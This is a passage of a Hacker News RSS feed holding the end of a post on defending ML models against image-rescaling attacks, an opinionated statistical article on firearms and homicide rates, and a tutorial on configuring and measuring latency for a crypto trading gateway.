<p>I got lucky, because initially Husky AI did use <code>OpenCV</code> and it‚Äôs default settings to resize images. But for some reason I changed that early on (not knowing it would also mitigate this attack).</p>
<p>If you use <code>OpenCV</code> the issue can be fixed by using the <code>interpolation</code> argument when calling the <code>resize</code> API to not have it use the default.</p>
<p>Hope that was useful and interesting.</p>
<p>Cheers,
Johann.</p>
<p><a href="https://twitter.com/wunderwuzzi23">@wunderwuzzi23</a></p>
<h2 id="references">References</h2>
<ul>
<li>Adversarial Preprocessing: Understanding and Preventing Image-Scaling Attacks in Machine Learning (<a href="https://www.usenix.org/system/files/sec20-quiring.pdf">https://www.usenix.org/system/files/sec20-quiring.pdf</a>) (Erwin Quiring, TU Braunschweig)</li>
<li><a href="https://github.com/EQuiw/2019-scalingattack">https://github.com/EQuiw/2019-scalingattack</a></li>
</ul>

  </section></div>]]>
            </description>
            <link>https://embracethered.com/blog/posts/2020/husky-ai-image-rescaling-attacks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24927655</guid>
            <pubDate>Thu, 29 Oct 2020 05:48:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Firearms by the Numbers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24927649">thread link</a>) | @lettergram
<br/>
October 28, 2020 | https://austingwalters.com/firearms-by-the-numbers/ | <a href="https://web.archive.org/web/*/https://austingwalters.com/firearms-by-the-numbers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3517">

<div>
<p>Firearms (guns) are one of the hot button issues in the United States and globally. I‚Äôm sure it is understandable why ‚Äî pull the trigger and something dies. Killing is the primary purpose of a firearm. Naturally, this leads many to be fearful of firearms, but should people be fearful?</p>
<p>When I started writing this, I wanted to answer:</p>
<blockquote><p>Are firearms inherently unsafe?</p>
<p>Should firearms be banned, as many believe?</p></blockquote>
<p>It‚Äôs quite ambitious. One may believe you can just find an answer on a website / paper somewhere or is obvious. Unfortunately, the reality is far more complicated and has turned this into my longest article to date.</p>
<p>It‚Äôs been said,</p>
<blockquote><p>Guns don‚Äôt kill people, people kill people. <em>‚Äì unknown</em></p></blockquote>
<p>Many agree and many others strongly disagree. That divisiveness has made firearms a political issue, leading to a plethora of bias studies, inaccurate analysis, and more. Thus, to answer these questions I had to go through the data myself; I pulled <a href="#Data_Tooling">data from the CDC, FBI, RAND, Census and others</a> and completed my own analysis.</p>
<p>For those interested, a PDF version of this document you can download here: <a href="https://austingwalters.com/wp-content/uploads/2020/10/Firearms-by-the-Numbers.pdf">Firearms by the Numbers</a>.</p>
<h4>Introduction</h4>
<p>Due to the nature of this analysis, it is important to highlight some items upfront.</p>
<p>1. The United States is often the focus throughout the analysis. This is because the United States has an abundance of firearms, a relatively uniform society and the most available &amp; accurate records.</p>
<p>2. This analysis focuses on general trends. Specific situations vary wildly, even in the same region: country, state, county, city, and neighborhood situations vary. As such, I caution making detailed / specific inference, beyond what the data explicitly shows (in the general case).</p>
<p>3. Some important data is lacking, such as socioeconomic status associated with crimes. This makes it very difficult to isolate confounding factors and leads to confusion / lack of definitive answer(s).</p>
<p>The goal of this analysis was to analyze available (and unbiased) data as in-depth as enabled, with no particular outcome in mind. <em>If new data comes in that materially changes what can be inferred, I‚Äôll attempt to update the analysis.</em> With that in mind, I want to highlight that I dive into demographic information and I found some surprises. Politics seems to stifle this topic and in fact the truth. Instead I went to the data, I hope you can find it as interesting as I do.</p>
<blockquote><p>The truth is not for all men, but only for those who seek it.<br>
‚Äì Ayn Rand</p></blockquote>
<p>If anything in this analysis was missed,<strong> please feel free to reach out or leave comments.</strong></p>


<p>Globally, firearms are highly controlled, particularly in the Europe and Asia. In contrast, the United States has more firearms held by it‚Äôs citizens than the rest of the world combined.<a href="https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country.png" alt="" width="1107" height="687" srcset="https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country.png 1107w, https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country-300x186.png 300w, https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country-1024x635.png 1024w, https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country-768x477.png 768w" sizes="(max-width: 1107px) 100vw, 1107px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country.png 1107w, https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country-300x186.png 300w, https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country-1024x635.png 1024w, https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country-768x477.png 768w"></a>The real question ‚Äî do the number of firearms really matter? From the graph above, it‚Äôs clear China, Russia and Iran have a high number of military firearms when compared civilian held firearms (and I suspect most civilian held firearms are former military, in countries such as China, Russia ,Iran, India, etc). In contrast, the ‚Äú<a href="https://en.wikipedia.org/wiki/Free_World" target="_blank" rel="noopener noreferrer">free world</a>‚Äù has an order of magnitude more civilian firearms, when compared to military firearms.</p>
<p>Clearly, what matters to ‚Äú<a href="https://en.wikipedia.org/wiki/Second_World" target="_blank" rel="noopener noreferrer">second world</a>‚Äù is having a large military arsenal, when compared to civilian held firearms.</p>
<p>It can be argued an unarmed society allows the military to impose their will, allowing countries to maintain the status quo and avoiding violent revolutions overthrowing the government.</p>
<h2><span id="Homicides_Firearms_Globally"></span>Homicides &amp; Firearms Globally<span></span></h2>
<p>In the ‚Äúfree world,‚Äù the main concern surrounding firearms are homicides &amp; suicides, with homicides being the most concerning. Below is a comparison of homicides by firearm deaths per 100,000 people across the globe.</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2.png" alt="" width="1228" height="677" srcset="https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2.png 1228w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2-300x165.png 300w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2-1024x565.png 1024w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2-768x423.png 768w" sizes="(max-width: 1228px) 100vw, 1228px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2.png 1228w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2-300x165.png 300w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2-1024x565.png 1024w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2-768x423.png 768w"></a>When we compare the world, a few things become clear:</p>
<ol>
<li>The America‚Äôs, Caribbean and Africa have a much higher firearm homicide rate</li>
<li>The United States has the highest firearm homicide rate of a ‚Äú<a href="https://en.wikipedia.org/wiki/First_World" target="_blank" rel="noopener noreferrer">first world</a>‚Äù country</li>
<li>Europe has the lowest firearm homicide rate globally</li>
</ol>
<p>What‚Äôs not clear, is whether or not firearms are really leading the increased firearm homicide rate.</p>
<p>Are homicides just naturally higher in these regions?</p>
<h2><span id="Firearm_Death_Rate_per_Firearm"></span>Firearm Death Rate per Firearm<span></span></h2>
<p>Below is an argument from the Amnesty International‚Äôs website:</p>
<blockquote><p>governments [with] poor regulation of the possession and use of <strong>guns lead to violence</strong> and that they must tackle this now through strict controls on guns and effective interventions in communities suffering high levels of gun violence.</p>
<p>‚Äì <a href="https://www.amnesty.org/en/what-we-do/arms-control/gun-violence/" target="_blank" rel="noopener noreferrer">Amnesty International</a></p></blockquote>
<p>The key statement is:</p>
<blockquote><p>Guns lead to violence</p></blockquote>
<p>The statement above implies a couple of things:</p>
<ol>
<li>Gun volume and violence are correlated</li>
<li>As the number of guns increase, violence increases</li>
</ol>
<p>There are a few ways to invalidate / validate this statement. The clearest method is to simply compare firearm deaths per firearm. If firearms lead to more violence, we should see the ratio of firearm deaths to firearms (firearm deaths / firearms) staying constant (or growing at a constant rate). This ratio should stay or grow at a constant rate because as the firearm count increases, the firearm homicides should increase (keeping the ratio constant). We could also assume a direct correlation if ‚Äúguns lead to violence‚Äù as it would probably occur at some constant rate.</p>
<p>Below you can see the comparison between firearm deaths and firearms:</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5.png" alt="" width="1313" height="687" srcset="https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5.png 1313w, https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5-300x157.png 300w, https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5-1024x536.png 1024w, https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5-768x402.png 768w" sizes="(max-width: 1313px) 100vw, 1313px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5.png 1313w, https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5-300x157.png 300w, https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5-1024x536.png 1024w, https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5-768x402.png 768w"></a>As seen in the chart, the Caribbean, South America, Africa have a high number of firearm deaths per firearm, Columbia having one death per five hundred firearms. In contrast, ‚ÄúFirst World‚Äù (Europe and the United States) has a much lower number of fatalities per firearm, the United States having only one death per ten thousand firearms.</p>
<h3><span id="Firearms_vs_Homicide_Rate"></span>Firearms vs Homicide Rate<span></span></h3>
<p>For further evidence firearms aren‚Äôt correlated with violence, it‚Äôs possible to directly compare the number of firearms vs homicides:<a href="https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5.png" alt="" width="1107" height="687" srcset="https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5.png 1107w, https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5-300x186.png 300w, https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5-1024x635.png 1024w, https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5-768x477.png 768w" sizes="(max-width: 1107px) 100vw, 1107px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5.png 1107w, https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5-300x186.png 300w, https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5-1024x635.png 1024w, https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5-768x477.png 768w"></a>Across the bottom of the chart you can see all the countries with high homicide rates. The United States stands out clearly, if firearms were correlated with homicides we‚Äôd expect the U.S. to have many more homicides than it currently does. It does not appear more firearms are correlated with more homicides, in fact the trend line shows the opposite to be true (more firearms are correlated to less homicides).</p>
<p>For a final validation, we can compare firearms against homicides and firearm homicides against total homicides. Both should have a similar growth rate, if there was a correlation.</p>
<figure id="attachment_3617" aria-describedby="caption-attachment-3617"><a href="https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1.png" alt="" width="1107" height="687" srcset="https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1.png 1107w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1-300x186.png 300w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1-1024x635.png 1024w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1-768x477.png 768w" sizes="(max-width: 1107px) 100vw, 1107px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1.png 1107w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1-300x186.png 300w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1-1024x635.png 1024w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1-768x477.png 768w"></a><figcaption id="caption-attachment-3617">* United States represented by a Star</figcaption></figure>
<p>It‚Äôs important to note the graph is a logarithmic comparison for homicides and homicides by firearm (firearms per 100k Inhabitants are not logarithmic). The trend line comparison of Total Homicides and Homicides by Firearm is linear, because the comparison is logarithmic, it appears exponential on the chart.</p>
<p>It is clear as homicides increase, homicides by firearm increase (blue data points). In contrast, when there are more firearms, homicides by firearm remain flat (purple data points), implying more firearms do not cause increase the number of homicides involving a firearm.</p>
<p>Further, you can see the blue star representing the United States homicide rate to homicide firearm deaths is right where it is expected. However, the purple star, representing the United States homicide rate to firearms per 100k inhabitants, is way outside the norm.</p>
<p>To summarize,</p>
<blockquote><p>Globally, as the firearm homicide rate increases, the total homicide rate increases; as the prevalence of firearms increase, the homicide rate <span>does not increase</span>.</p></blockquote>

<p>The United States is clearly the largest holder of firearms in the world, most states have more firearms than entire countries. Fun fact:</p>
<blockquote><p>Texans and the Chinese military have the same number of firearms.</p></blockquote>
<p>Clearly, there‚Äôs a culture of gun ownership in the United States. When the United States was formed it had just fought a war of independence and regularly combated Native Americans, settling North America by force. Even today, the <a href="https://en.wikipedia.org/wiki/United_States_National_Guard" target="_blank" rel="noopener noreferrer">United States National Guard</a> is one of the largest militias in the world.</p>
<blockquote><p>A well regulated Militia, being necessary to the security of a free State, the right of the people to keep and bear Arms, shall not be infringed.<br>
‚Äì<a href="https://constitution.congress.gov/constitution/amendment-2/"> Constitution of the United States</a></p></blockquote>
<p>Without diving into politics, the constitution &amp; culture has enabled the United States to be relatively unique. Firearms are regulated, but just barely. Generally, citizens can do everything from carrying a firearms in public to purchasing assault rifles, flamethrowers, <a href="https://en.wikipedia.org/wiki/Minigun" target="_blank" rel="noopener noreferrer">miniguns</a>, rocket launcher(s), etc. Often the only requirement is obtaining permit to own weapons, after that you can regularly purchase as many firearms as you‚Äôd like.</p>
<p>As seen in the previous section, the United States does have a higher (on average) number of firearm deaths. However, this doesn‚Äôt necessarily tell the whole story. In the prior section, we focused on the homicide rate. In the following sections, the focus will expand as uniform data collection, similar social norms and a widespread framework for law makes comparisons much easier.</p>
<p>Some topics we will explore here are:</p>
<ul>
<li>Suicide vs homicide vs accidental rates</li>
<li>The type of weapons used in homicides</li>
<li>How demographics impact firearm fatalities</li>
<li>How firearm fatalities compare to other fatalities</li>
</ul>
<h2><span id="Suicides_Homicides_in_the_United_States"></span>Suicides &amp; Homicides in the United States<span></span></h2>
<p>First, it is also important to highlight just how small the number of firearm related homicides really are, when compared to all deaths. On average, the total (suicide, homicide &amp; accidental) number of firearm related fatalities account for about 1.33% of all deaths in the United States (firearm related homicides account for ~0.44% of all deaths) and it varies wildly between states.</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2020/10/2015-U.S.-Deaths-per-State-normal.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/10/2015-U.S.-Deaths-per-State-normal.png" alt="" width="736" height="855" srcset="https://austingwalters.com/wp-content/uploads/2020/10/2015-U.S.-Deaths-per-State-normal.png 736w, https://austingwalters.com/wp-content/uploads/2020/10/2015-U.S.-Deaths-per-State-normal-258x300.png 258w" sizes="(max-width: 736px) 100vw, 736px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/10/2015-U.S.-Deaths-per-State-normal.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/10/2015-U.S.-Deaths-per-State-normal.png 736w, https://austingwalters.com/wp-content/uploads/2020/10/2015-U.S.-Deaths-per-State-normal-258x300.png 258w"></a></p>
<p>Perhaps the most important item to discuss is the ‚Äú<em>firearm fatality rate</em>‚Äú, often conflated with the ‚Äú<em>firearm homicide rate</em>‚Äù by political pundits. While all fatalities are unfortunate, most American‚Äôs would argue there is a different between <em>suicides</em> and <em>homicides</em>. Some states, such as Washington, support medically assisted suicides (for the terminally ill).</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://austingwalters.com/firearms-by-the-numbers/">https://austingwalters.com/firearms-by-the-numbers/</a></em></p>]]>
            </description>
            <link>https://austingwalters.com/firearms-by-the-numbers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24927649</guid>
            <pubDate>Thu, 29 Oct 2020 05:45:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Roq ‚Äì Demonstrating low Œºs response times for algorithmic trading]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24927623">thread link</a>) | @thraneh
<br/>
October 28, 2020 | https://roq-trading.com/posts/latency_experiment/ | <a href="https://web.archive.org/web/*/https://roq-trading.com/posts/latency_experiment/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><section></section><section><div><div><div><h2>Latency Experiment</h2><div><ul>Posted by<li><span>Hans Erik Thrane</span>
on 2020-09-20</li></ul></div></div><div><div><div><p>The purpose is to demonstrate the host specific latency profile using a
reasonably realistic trading setup.
By following the steps outlined in this document, you should be in a position
to measure latencies on your own server configuration.</p><div id="summary"><h2>1&nbsp;&nbsp;&nbsp;Summary</h2><p>The test setup includes a Deribit gateway and two connected clients.</p><p>The gateway connects to Deribit's testnet.</p><p>Both clients will automatically respond to ping messages sent by the gateway.</p><p>Client #1 will subscribe all symbols from the gateway.</p><p>Client #2 is a simple trading strategy which will manage orders
through the gateway.
This client only needs to subscribe a single symbol.</p><p>All components will be configured for low latency.</p><p>This document will</p><ul><li>Describe<ul><li>A typical server configuration</li><li>How to install and configure the software</li><li>How to extract latency metrics from the running gateway</li></ul></li><li>Demonstrate<ul><li>Function profiling</li><li>Internal ping latency</li><li>Internal round-trip latency</li><li>External latency</li></ul></li></ul></div><div id="preparations"><h2>2&nbsp;&nbsp;&nbsp;Preparations</h2><div id="platform"><h3>2.1&nbsp;&nbsp;&nbsp;Platform</h3><p>This is the server configuration used for testing</p><ul><li>AMD EPYC 3251 8-Core Processor</li><li>Hyper threading disabled in the BIOS</li><li>Ubuntu 18.04 LTS</li><li>Kernel boot command-line includes <code>isolcpu=1-6</code></li><li>Dynamic frequency scaling disabled using <code>tuned-adm profile network-latency</code></li><li>Docker CE installed</li><li>Prometheus and Grafana running on same host (as Docker containers)</li></ul><div><p>Note</p><p>A true low latency configuration should use RSS (receive packet steering), IRQ
balancing, have local timer interrupts disabled, etc.
However, these are advanced topics and not required for most use-cases.</p></div><p>Knowing the NUMA architecture is very important if you want to achieve the
lowest inter-process latencies</p><pre>$ lstopo --no-io
Machine <span>(</span>31GB<span>)</span> + Package L#0
  L3 L#0 <span>(</span>8192KB<span>)</span>
    L2 L#0 <span>(</span>512KB<span>)</span> + L1d L#0 <span>(</span>32KB<span>)</span> + L1i L#0 <span>(</span>64KB<span>)</span> + Core L#0 + PU L#0 <span>(</span>P#0<span>)</span>
    L2 L#1 <span>(</span>512KB<span>)</span> + L1d L#1 <span>(</span>32KB<span>)</span> + L1i L#1 <span>(</span>64KB<span>)</span> + Core L#1 + PU L#1 <span>(</span>P#1<span>)</span>
    L2 L#2 <span>(</span>512KB<span>)</span> + L1d L#2 <span>(</span>32KB<span>)</span> + L1i L#2 <span>(</span>64KB<span>)</span> + Core L#2 + PU L#2 <span>(</span>P#4<span>)</span>
    L2 L#3 <span>(</span>512KB<span>)</span> + L1d L#3 <span>(</span>32KB<span>)</span> + L1i L#3 <span>(</span>64KB<span>)</span> + Core L#3 + PU L#3 <span>(</span>P#5<span>)</span>
  L3 L#1 <span>(</span>8192KB<span>)</span>
   L2 L#4 <span>(</span>512KB<span>)</span> + L1d L#4 <span>(</span>32KB<span>)</span> + L1i L#4 <span>(</span>64KB<span>)</span> + Core L#4 + PU L#4 <span>(</span>P#2<span>)</span>
   L2 L#5 <span>(</span>512KB<span>)</span> + L1d L#5 <span>(</span>32KB<span>)</span> + L1i L#5 <span>(</span>64KB<span>)</span> + Core L#5 + PU L#5 <span>(</span>P#3<span>)</span>
   L2 L#6 <span>(</span>512KB<span>)</span> + L1d L#6 <span>(</span>32KB<span>)</span> + L1i L#6 <span>(</span>64KB<span>)</span> + Core L#6 + PU L#6 <span>(</span>P#6<span>)</span>
   L2 L#7 <span>(</span>512KB<span>)</span> + L1d L#7 <span>(</span>32KB<span>)</span> + L1i L#7 <span>(</span>64KB<span>)</span> + Core L#7 + PU L#7 <span>(</span>P#7<span>)</span>
</pre><p>We will be running the gateway on processor #1.</p><p>The lowest latencies can be achieved if we run clients on processor #4 and #5
since they reside on the same node as processor #1.</p><p>We will include an experiment to measure the cross-connect between the two nodes.
That can be achieved by running one of the clients on processor #3, for example.</p><p>Further readings</p><ul><li><a href="https://roq-trading.com/docs/tutorials/deployment/ubuntu/">How to configure an Ubuntu server</a></li></ul></div><div id="prerequisites"><h3>2.2&nbsp;&nbsp;&nbsp;Prerequisites</h3><p>Download Miniconda</p><pre>wget -N https://repo.continuum.io/miniconda/Miniconda3-latest-Linux-x86_64.sh
</pre><p>Install Miniconda</p><pre>bash Miniconda3-latest-Linux-x86_64.sh -b -u -p ~/miniconda3
</pre><p>Activate conda</p><pre><span>source</span> ~/miniconda3/bin/activate
</pre><div><p>Note</p><p>You should repeat this step whenever you open a new terminal
window and you need to access your conda environment.</p></div><p>Install the required packages</p><pre>conda install <span>\
</span>    --channel https://roq-trading.com/conda/stable <span>\
</span>    roq-deribit <span>\
</span>    roq-samples <span>\
</span>    roq-test
</pre><p>Further readings</p><ul><li><a href="https://roq-trading.com/docs/tutorials/conda/">How to install Miniconda and how to use conda</a></li><li><a href="https://roq-trading.com/docs/reference/gateways/crypto/roq-deribit/">Deribit reference documentation</a></li></ul></div><div id="gateway"><h3>2.3&nbsp;&nbsp;&nbsp;Gateway</h3><p>Let's create a config file named <code>deribit.toml</code>.
You can start by copying the template</p><pre>cp <span>$CONDA_PREFIX</span>/share/roq/deribit/config.toml deribit.toml
</pre><p>Edit the config file and update with your Deribit API key and secret</p><pre><span>[symbols]</span>
  <span>include</span> <span>=</span> <span>".*"</span>
  <span>exclude</span> <span>=</span> <span>"USDT-.*

[accounts]

  [accounts.A1]
  master = true
  login = "</span><span>YOUR_DERIBIT_LOGIN_GOES_HERE</span><span>"
  secret = "</span><span>YOUR_DERIBIT_SECRET_GOES_HERE</span><span>"
  symbols = "</span><span>.</span><span>*</span><span>"

[users]

  [users.test]
  password = "</span><span>1234</span><span>"
  symbols = "</span><span>.</span><span>*</span><span>"

  [users.trader]
  password = "</span><span>secret</span><span>"
  accounts = [ "</span><span>A1</span><span>" ]
  symbols = [ "</span><span>BTC-</span><span>.</span><span>*"</span> <span>]</span>
  <span>monitor_period_secs</span> <span>=</span> <span>60</span>
  <span>ban_period_secs</span> <span>=</span> <span>300</span>
  <span>request_limit</span> <span>=</span> <span>10</span>
</pre><div><p>Note</p><p>Update with your specific details.</p><p>You can search for <code>YOUR_DERIBIT</code> and change accordingly.</p></div><p>It is convenient to create flag file named <code>deribit.gflags</code>
with the following content</p><pre><span>--name</span><span>=</span><span>deribit</span>
<span>--metrics-listen-address</span><span>=</span><span>1234</span>
<span>--fix-uri</span><span>=</span><span>tcp://test.deribit.com:9881</span>
<span>--ws-uri</span><span>=</span><span>wss://test.deribit.com/ws/api/v2</span>
<span>--loop-sleep-nsecs</span><span>=</span><span>0</span>
<span>--loop-timer-freq-nsecs</span><span>=</span><span>250</span>
</pre><div><p>Note</p><p>You can read more about gflags and flag files
<a href="https://gflags.github.io/gflags/#flagfiles">here</a>.</p></div><p>The gateway can now be started like this</p><pre>roq-deribit <span>\
</span>  --config-file <span>"deribit.toml"</span> <span>\
</span>  --flagfile <span>"deribit.gflags"</span> <span>\
</span>  --loop-cpu-affinity<span>=</span><span>1</span> <span>\
</span>  --client-listen-address ~/deribit.sock
</pre><p>Further readings</p><ul><li><a href="https://roq-trading.com/docs/tutorials/gateways/">How to install and configure gateways</a></li><li><a href="https://roq-trading.com/docs/reference/gateways/crypto/roq-deribit/">Deribit reference documentation</a></li></ul></div><div id="client-1"><h3>2.4&nbsp;&nbsp;&nbsp;Client #1</h3><p>Started like this</p><pre>roq-samples-example-4 <span>\
</span>  --name <span>"test"</span> <span>\
</span>  --exchange <span>"deribit"</span> <span>\
</span>  --symbols <span>".*"</span> <span>\
</span>  --dispatcher-affinity <span>4</span> <span>\
</span>  ~/deribit.sock
</pre></div><div id="client-2"><h3>2.5&nbsp;&nbsp;&nbsp;Client #2</h3><p>Started like this</p><pre>roq-test <span>\
</span>  --name <span>"trader"</span> <span>\
</span>  --exchange <span>"deribit"</span> <span>\
</span>  --symbol <span>"BTC-PERPETUAL"</span> <span>\
</span>  --dispatcher-affinity <span>5</span> <span>\
</span>  --enable-trading <span>\
</span>  ~/deribit.sock
</pre></div></div><div id="testing"><h2>3&nbsp;&nbsp;&nbsp;Testing</h2><div id="metrics"><h3>3.1&nbsp;&nbsp;&nbsp;Metrics</h3><p>Gateway metrics can be retrieved from the HTTP interface</p><pre>curl -s http://localhost:1234/metrics <span>2</span>&gt;<span>&amp;</span><span>1</span> <span>|</span> less
</pre><p>For example, profiling information</p><pre><span>#</span> TYPE roq_profile histogram
<span>roq_profile_bucket{source="deribit", connection="ws", function="parse", le="500"} 0
roq_profile_bucket{source="deribit", connection="ws", function="parse", le="1000"} 0
roq_profile_bucket{source="deribit", connection="ws", function="parse", le="2000"} 0
roq_profile_bucket{source="deribit", connection="ws", function="parse", le="5000"} 795
roq_profile_bucket{source="deribit", connection="ws", function="parse", le="10000"} 8471
roq_profile_bucket{source="deribit", connection="ws", function="parse", le="20000"} 8884
roq_profile_bucket{source="deribit", connection="ws", function="parse", le="+Inf"} 8895
roq_profile_sum{source="deribit", connection="ws", function="parse"} 6.13741e+07
roq_profile_count{source="deribit", connection="ws", function="parse"} 8895</span>
</pre><p>This collection represents a histogram of all measurements since the gateway started.
Each bucket has a total count for observations less-than or equal-to the number of nanoseconds,
starting with 500 and ending with infinity.
The sum is the total nanoseconds spent in the function.
The count is the total number of times the function has been called.</p><p>Prometheus allows you to capture a time-series of these metrics and then compute
incremental statistics.</p><p>For example, this would be the average processing time over a 1 minute rolling window</p><pre>irate(roq_profile_sum[1m]) / on (source, connection, function)
irate(roq_profile_count[1m])
</pre><p>And this would be a conditional distribution, the percentage of events where processing time is larger
than 5 microseconds</p><pre>1 - irate(roq_profile_bucket{le="5000"}[1m]) / on (source, connection, function)
irate(roq_profile_count[1m])
</pre><p>Further readings</p><ul><li><a href="https://prometheus.io/docs/practices/histograms/">Histograms</a></li></ul></div><div id="function-profiling"><h3>3.2&nbsp;&nbsp;&nbsp;Function Profiling</h3><p>The following charts are lifted straight from Grafana using
